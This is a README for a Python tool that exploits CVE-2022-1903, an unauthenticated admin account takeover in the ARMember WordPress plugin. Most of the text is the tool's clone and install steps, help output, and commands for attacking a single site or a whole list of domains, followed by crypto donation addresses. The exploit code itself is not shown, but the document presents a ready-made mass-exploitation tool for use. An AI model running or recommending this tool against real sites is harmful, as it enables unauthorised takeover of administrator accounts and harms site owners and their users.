# CVE-2022-1903
[![made-with-python](https://img.shields.io/badge/Made%20with-Python-1f425f.svg)](https://www.python.org/)

```
Title: ARMember < 3.4.8 - Unauthenticated Admin Account Takeover
Author: Cyllective [ https://cyllective.com/ ]
CVE: CVE-2022-1903
```

### Installation
```
git clone https://github.com/biulove0x/CVE-2022-1903.git
cd CVE-2022-1903/
python3 -m pip install -r requirements.txt
```

### How to run autoexploit
```
$ python3 ARMember.py --help
###########################################
# @author : biulove0x                     #
# @name   : WP Plugins ARMember Exploiter #
# @cve    : CVE-2022-1903                 #
###########################################

usage: armember.py [-h] [-t example.com] [-l target.txt]

CVE-2022-1903 [ ARMember < 3.4.8 - Unauthenticated Admin Account Takeover ]

optional arguments:
  -h, --help      show this help message and exit
  -t example.com  Single target
  -l target.txt   Multiple target
```

#### Single target
```
$ python3 ARMember.py -t http://example.com/
```

#### Multiple target
```
$ cat domains.txt
http://example.com/
https://examples.com/

$ python3 ARMember.py -l target.txt
```

### References :

* https://wpscan.com/vulnerability/28d26aa6-a8db-4c20-9ec7-39821c606a08

### Donate :
BTC : bc1qst09sxcnq97a4wgsqvpkg4fxyjczvs3xe7278h

BNB : bnb1jhp2hv9utr8u97387p35fmftgr8wpjp39altz0

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/biulove0x)
